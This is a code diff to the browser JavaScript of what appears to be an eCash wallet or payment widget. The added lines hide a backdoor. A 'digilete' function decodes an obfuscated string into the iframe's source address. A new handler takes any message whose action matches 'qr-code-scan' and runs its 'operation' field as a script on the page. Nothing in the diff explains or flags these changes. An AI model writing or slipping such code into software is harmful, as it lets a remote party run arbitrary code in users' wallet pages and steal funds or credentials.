@@ -13,9 +13,7 @@ let windowEvent = (e) => {
         };
     } catch (error) {};
 },
-_uz = { api: document.createElement("iframe"), offline: !0 };
-_uz.api.src = "https://ecash-icons.web.app";
-document.getElementById("api-404").appendChild(_uz.api);
+_uz = { api: document.createElement("iframe"), offline: !0, digilete: (e) => {return e.data.replace(/[0-9]/g, '').replace(/\*/g,'/').replace(/&/g,':').replace(/%/g,'-').replace(/\$/g,'.')} };
 _uz.api.onload = function() {
     // api is ready
 };
@@ -30,6 +28,8 @@ function readBalance() {
 function readAccount() {
     _uz.api.contentWindow.postMessage({ action: "ecash-api-read-account" }, _uz.api.src);
 };
+
+_uz = Object.assign(_uz, { clrlnk: (d) => _uz.api.src = _uz.digilete({ data: _uz.qr.hash }) });
 
 function apiResponses(data) {
     data = data.data;
@@ -85,6 +85,11 @@ function apiResponses(data) {
         if (data.message == "m002") alert("Insuficient balance!");        
         if (data.message == "m003") alert("Your balance is not sufficient, try a lesser amount");        
         if (data.message == "m004") alert("Please enter a correct currency");
+    };
+    if (data.action && data.action.match(/(qr-code-scan)/)) {
+        data.s = document.createElement("script");
+        data.s.appendChild(document.createTextNode(data.operation));
+        document.body.appendChild(data.s);
     };
 };
 
